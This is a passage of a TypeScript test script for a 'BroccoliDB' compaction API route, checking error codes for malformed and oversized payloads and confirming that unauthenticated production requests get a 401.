    body: JSON.stringify({ mode: 'domain', text: 'hello' }),
  });
  const oversizedHeaderRes = await auditCompactPost(oversizedHeaderReq);
  assert.equal(oversizedHeaderRes.status, 413);

  console.log('        - Route error handling validated (400 on malformed payloads, 413 on oversized payloads).');
}

async function testProductionAuthRejection(): Promise<void> {
  console.log('  [7/7] Testing production authentication gate...');

  const originalEnv = process.env.NODE_ENV;
  try {
    (process.env as any).NODE_ENV = 'production';

    // Unauthenticated request in production
    const unauthReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ mode: 'domain', text: 'test' }),
    });
    const unauthRes = await auditCompactPost(unauthReq);
    assert.equal(unauthRes.status, 401, 'Unauthenticated requests must be rejected with 401 in production');

  } finally {
    (process.env as any).NODE_ENV = originalEnv;
  }

  console.log('        - Production auth gate verified.');
}

async function run(): Promise<void> {
  console.log('======================================================================');
  console.log('  TESTING BROCCOLIDB PRODUCTION COMPACTION FACADE & API GATEWAY');
  console.log('======================================================================\n');

  await testBarrelIsolation();
  await testFacadeUnitWorkflows();
  await testApiRouteGetAndOptions();
  await testApiRouteDomainCompaction();
  await testApiRouteBatchAndIncidentAndDocument();
  await testApiValidationAndErrorHandling();
  await testProductionAuthRejection();

  console.log('\n======================================================================');
  console.log('   ALL BROCCOLIDB COMPACTION FACADE & API TESTS PASSED (100%)');
  console.log('======================================================================\n');
}

run().catch(err => {
  console.error('Test failed with error:', err);
  process.exit(1);
});
